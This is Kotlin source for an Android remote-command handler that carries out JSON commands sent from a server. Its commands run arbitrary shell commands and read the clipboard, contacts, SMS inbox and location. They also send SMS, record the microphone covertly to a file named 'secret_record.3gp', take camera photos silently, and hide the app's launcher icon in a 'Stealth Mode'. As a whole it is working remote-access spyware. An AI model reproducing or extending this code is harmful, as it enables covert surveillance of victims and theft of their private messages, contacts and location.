package com.example.devicecontrol

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.widget.Toast
import org.json.JSONObject
import org.json.JSONArray
import android.os.Handler
import android.os.Looper
import android.media.AudioManager
import android.hardware.camera2.CameraManager
import android.speech.tts.TextToSpeech
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.hardware.SensorManager
import android.hardware.Sensor
import java.io.BufferedReader
import java.io.InputStreamReader
import android.content.ClipboardManager
import android.content.ClipData
import java.util.Locale
import android.location.LocationManager
import android.net.Uri
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.net.wifi.WifiManager
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import android.Manifest
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.graphics.ImageFormat
import android.os.HandlerThread

class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {

    private var tts: TextToSpeech? = null
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

    init {
        tts = TextToSpeech(context, this)
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            tts?.language = Locale("id", "ID")
        }
    }

    private fun checkPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
    }

    fun handle(jsonStr: String, sendResponse: (String) -> Unit) {
        var cmdId = ""
        try {
            val json = JSONObject(jsonStr)
            val command = json.getString("command")
            cmdId = json.optString("id", "")
            val textArg = json.optString("text", "")

            when (command) {
                // ============== FASE 1 ==============
                "ping" -> {
                    sendResponse(createResponse(cmdId, "pong", "Alive"))
                }
                "get_device_info" -> {
                    val info = JSONObject().apply {
                        put("model", Build.MODEL)
                        put("brand", Build.BRAND)
                        put("sdk", Build.VERSION.SDK_INT)
                        put("release", Build.VERSION.RELEASE)
                    }
                    sendResponse(createResponse(cmdId, "device_info", info))
                }
                "get_battery" -> {
                    val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                    val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    sendResponse(createResponse(cmdId, "battery_level", level))
                }
                "show_toast" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, textArg.ifEmpty { "Remote Command" }, Toast.LENGTH_SHORT).show()
                    }
                    sendResponse(createResponse(cmdId, "toast", "Displayed: $textArg"))
                }
                "shell" -> {
                    try {
                        val process = Runtime.getRuntime().exec(textArg.ifEmpty { "ls" })
                        val reader = BufferedReader(InputStreamReader(process.inputStream))
                        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
                        
                        val output = StringBuilder()
                        var line: String?
                        while (reader.readLine().also { line = it } != null) output.append(line).append("\n")
                        while (errorReader.readLine().also { line = it } != null) output.append(line).append("\n")
                        process.waitFor()
                        sendResponse(createResponse(cmdId, "shell_output", output.toString()))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Shell failed: ${e.message}"))
                    }
                }
                "get_volume" -> {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    val volInfo = JSONObject().apply {
                        put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
                        put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
                        put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
                        put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
                        put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                    }
                    sendResponse(createResponse(cmdId, "volume_info", volInfo))
                }
                "set_volume" -> {
                    val parts = textArg.split(" ")
                    if (parts.size >= 2) {
                        val type = parts[0]
                        val vol = parts[1].toIntOrNull() ?: 0
                        val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                        val stream = when (type.lowercase()) {
                            "music" -> AudioManager.STREAM_MUSIC
                            "ring" -> AudioManager.STREAM_RING
                            "alarm" -> AudioManager.STREAM_ALARM
                            "notification" -> AudioManager.STREAM_NOTIFICATION
                            else -> AudioManager.STREAM_MUSIC
                        }
                        am.setStreamVolume(stream, vol, 0)
                        sendResponse(createResponse(cmdId, "success", "Volume $type set to $vol"))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Format: set_volume [type] [level]"))
                    }
                }
                "torch" -> {
                    try {
                        val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                        val cameraId = camManager.cameraIdList[0] 
                        val state = textArg.lowercase() == "on"
                        camManager.setTorchMode(cameraId, state)
                        sendResponse(createResponse(cmdId, "success", "Torch $state"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Torch err: ${e.message}"))
                    }
                }
                "tts" -> {
                    tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
                    sendResponse(createResponse(cmdId, "success", "Speaking..."))
                }
                "notify" -> {
                    val parts = textArg.split("|")
                    val title = if (parts.isNotEmpty()) parts[0] else "System Alert"
                    val content = if (parts.size > 1) parts[1] else "Message from server"
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        val channel = NotificationChannel("remote_notify", "Remote Messages", NotificationManager.IMPORTANCE_HIGH)
                        notificationManager.createNotificationChannel(channel)
                    }
                    val notification = NotificationCompat.Builder(context, "remote_notify")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setContentTitle(title)
                        .setContentText(content)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .build()
                        
                    notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
                    sendResponse(createResponse(cmdId, "success", "Notification pushed"))
                }
                "sensors" -> {
                    val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                    val list = sm.getSensorList(Sensor.TYPE_ALL)
                    val result = JSONArray()
                    for (s in list) {
                        val obj = JSONObject()
                        obj.put("name", s.name)
                        obj.put("vendor", s.vendor)
                        obj.put("type", s.type)
                        result.put(obj)
                    }
                    sendResponse(createResponse(cmdId, "sensor_list", result))
                }
                "clipboard" -> {
                    try {
                        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                        if (cm.hasPrimaryClip() && cm.primaryClip != null && cm.primaryClip!!.itemCount > 0) {
                            val txt = cm.primaryClip!!.getItemAt(0).text.toString()
                            sendResponse(createResponse(cmdId, "clipboard_content", txt))
                        } else {
                            sendResponse(createResponse(cmdId, "clipboard_content", "[Empty or Background Restricted]"))
                        }
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Clipboard access blocked by OS: ${e.message}"))
                    }
                }

                // ============== FASE 2 ==============
                "location" -> {
                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) || checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                        var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        
                        if (loc != null) {
                            val obj = JSONObject().apply {
                                put("lat", loc.latitude)
                                put("lon", loc.longitude)
                                put("accuracy", loc.accuracy)
                                put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
                            }
                            sendResponse(createResponse(cmdId, "location_data", obj))
                        } else {
                            sendResponse(createResponse(cmdId, "error", "Location unavailable or GPS off"))
                        }
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing LOCATION permission"))
                    }
                }
                "contacts" -> {
                    if (checkPerm(Manifest.permission.READ_CONTACTS)) {
                        val result = JSONArray()
                        val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
                        cursor?.let {
                            var count = 0
                            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            while (it.moveToNext() && count < 200) {
                                val obj = JSONObject()
                                obj.put("name", it.getString(nameIdx))
                                obj.put("number", it.getString(numIdx))
                                result.put(obj)
                                count++
                            }
                            it.close()
                        }
                        sendResponse(createResponse(cmdId, "contacts_list", result))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing READ_CONTACTS permission"))
                    }
                }
                "sms_list" -> {
                    if (checkPerm(Manifest.permission.READ_SMS)) {
                        val result = JSONArray()
                        val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
                        cursor?.let {
                            var count = 0
                            val addrIdx = it.getColumnIndex("address")
                            val bodyIdx = it.getColumnIndex("body")
                            val dateIdx = it.getColumnIndex("date")
                            while (it.moveToNext() && count < 50) {
                                val obj = JSONObject()
                                obj.put("from", it.getString(addrIdx))
                                obj.put("body", it.getString(bodyIdx))
                                obj.put("date", it.getLong(dateIdx))
                                result.put(obj)
                                count++
                            }
                            it.close()
                        }
                        sendResponse(createResponse(cmdId, "sms_inbox", result))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing READ_SMS permission"))
                    }
                }
                "sms_send" -> {
                    if (checkPerm(Manifest.permission.SEND_SMS)) {
                        val parts = textArg.split("|")
                        if (parts.size >= 2) {
                            val number = parts[0]
                            val message = parts[1]
                            SmsManager.getDefault().sendTextMessage(number, null, message, null, null)
                            sendResponse(createResponse(cmdId, "success", "SMS Sent to $number"))
                        } else {
                            sendResponse(createResponse(cmdId, "error", "Format error. Use: [number]|[message]"))
                        }
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing SEND_SMS permission"))
                    }
                }
                "wifi_scan" -> {
                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) && checkPerm(Manifest.permission.ACCESS_WIFI_STATE)) {
                        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                        wm.startScan()
                        val results = wm.scanResults
                        val arr = JSONArray()
                        for (res in results) {
                            val obj = JSONObject()
                            obj.put("ssid", res.SSID)
                            obj.put("bssid", res.BSSID)
                            obj.put("level", res.level)
                            arr.put(obj)
                        }
                        sendResponse(createResponse(cmdId, "wifi_networks", arr))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing WIFI/LOC permissions"))
                    }
                }
                // ============== FASE 3 ==============
                "play_sound" -> {
                    val url = textArg
                    if (url.isNotEmpty()) {
                        Thread {
                            try {
                                val mp = android.media.MediaPlayer()
                                mp.setDataSource(url)
                                mp.prepare()
                                mp.start()
                                sendResponse(createResponse(cmdId, "success", "Memainkan suara dari $url"))
                            } catch (e: Exception) {
                                sendResponse(createResponse(cmdId, "error", "Gagal memutar: ${e.message}"))
                            }
                        }.start()
                    } else sendResponse(createResponse(cmdId, "error", "URL tidak boleh kosong (format: /cmd play_sound url)"))
                }
                "record_sound" -> {
                    if (checkPerm(Manifest.permission.RECORD_AUDIO)) {
                        val durationMs = textArg.toLongOrNull() ?: 5000L // default merekam 5 detik
                        val file = java.io.File(context.cacheDir, "secret_record.3gp")
                        Thread {
                            try {
                                val mr = android.media.MediaRecorder()
                                mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                                mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
                                mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
                                mr.setOutputFile(file.absolutePath)
                                mr.prepare()
                                mr.start()
                                Thread.sleep(durationMs)
                                mr.stop()
                                mr.release()
                                
                                val bytes = file.readBytes()
                                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
                                sendResponse(createResponse(cmdId, "audio_base64", b64))
                            } catch (e: Exception) {
                                sendResponse(createResponse(cmdId, "error", "Gagal merekam: ${e.message}"))
                            }
                        }.start()
                    } else sendResponse(createResponse(cmdId, "error", "Izin RECORD_AUDIO belum di-ALLOW"))
                }
                "photo" -> {
                    if (checkPerm(Manifest.permission.CAMERA)) {
                        val isFront = textArg.lowercase() == "front"
                        Thread {
                            try {
                                val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                                var targetCameraId: String? = null
                                
                                for (camId in camManager.cameraIdList) {
                                    val chars = camManager.getCameraCharacteristics(camId)
                                    val facing = chars.get(CameraCharacteristics.LENS_FACING)
                                    if (isFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                                        targetCameraId = camId; break
                                    } else if (!isFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                                        targetCameraId = camId; break
                                    }
                                }
                                
                                if (targetCameraId == null) targetCameraId = camManager.cameraIdList.firstOrNull()
                                
                                if (targetCameraId != null) {
                                    val handlerThread = HandlerThread("CameraBackground").apply { start() }
                                    val handler = Handler(handlerThread.looper)
                                    
                                    val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
                                    var isCaptured = false
                                    var activeCamera: CameraDevice? = null
                                    var activeSession: CameraCaptureSession? = null
                                    
                                    imageReader.setOnImageAvailableListener({ reader ->
                                        if (!isCaptured) {
                                            isCaptured = true
                                            try {
                                                val image = reader.acquireLatestImage()
                                                val buffer = image.planes[0].buffer
                                                val bytes = ByteArray(buffer.remaining())
                                                buffer.get(bytes)
                                                image.close()
                                                
                                                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                                                sendResponse(createResponse(cmdId, "photo_base64", b64))
                                            } catch (e: Exception) {
                                                sendResponse(createResponse(cmdId, "error", "Gagal memproses gambar: ${e.message}"))
                                            } finally {
                                                reader.close()
                                                activeSession?.close()
                                                activeCamera?.close()
                                                handlerThread.quitSafely()
                                            }
                                        }
                                    }, handler)
                                    
                                    // Buka kamera
                                    camManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                                        override fun onOpened(camera: CameraDevice) {
                                            activeCamera = camera
                                            try {
                                                val surfaces = listOf(imageReader.surface)
                                                camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                                                    override fun onConfigured(session: CameraCaptureSession) {
                                                        activeSession = session
                                                        try {
                                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                                            captureBuilder.addTarget(imageReader.surface)
                                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                                            session.capture(captureBuilder.build(), null, handler)
                                                        } catch (e: Exception) {
                                                            sendResponse(createResponse(cmdId, "error", "Gagal di stage Capture: ${e.message}"))
                                                            session.close()
                                                            camera.close()
                                                        }
                                                    }
                                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                                        sendResponse(createResponse(cmdId, "error", "Capture Session Failed"))
                                                        session.close()
                                                        camera.close()
                                                    }
                                                }, handler)
                                            } catch (e: Exception) {
                                                sendResponse(createResponse(cmdId, "error", "Session Error: ${e.message}"))
                                                camera.close()
                                            }
                                        }
                                        override fun onDisconnected(camera: CameraDevice) { camera.close() }
                                        override fun onError(camera: CameraDevice, error: Int) {
                                            sendResponse(createResponse(cmdId, "error", "Camera Device Error code: $error"))
                                            camera.close()
                                        }
                                    }, handler)
                                } else {
                                    sendResponse(createResponse(cmdId, "error", "Kamera target tidak ditemukan!"))
                                }
                            } catch (e: Exception) {
                                sendResponse(createResponse(cmdId, "error", "Termux-Camera Hack Gagal: ${e.message}"))
                            }
                        }.start()
                    } else sendResponse(createResponse(cmdId, "error", "Izin CAMERA belum di-ALLOW OS Android!"))
                }
                "hide_app" -> {
                    try {
                        val packageManager = context.packageManager
                        
                        // Disable Alias
                        packageManager.setComponentEnabledSetting(
                            android.content.ComponentName(context, "com.example.devicecontrol.LauncherAlias"),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                        
                        // Disable Main Component
                        packageManager.setComponentEnabledSetting(
                            android.content.ComponentName(context, MainActivity::class.java),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                        
                        sendResponse(createResponse(cmdId, "hide_app", "Aplikasi berhasil disembunyikan dari laci utama (Stealth Mode Aktif)"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal menyembunyikan ikon: ${e.message}"))
                    }
                }
                else -> {
                    sendResponse(createResponse(cmdId, "error", "Unknown command: $command"))
                }
            }
        } catch (e: Exception) {
            sendResponse(createResponse(cmdId, "error", e.message ?: "Logic Error"))
        }
    }

    private fun createResponse(cmdId: String, type: String, data: Any): String {
        return JSONObject().apply {
            if (cmdId.isNotEmpty()) put("id", cmdId)
            put("type", type)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }.toString()
    }
}
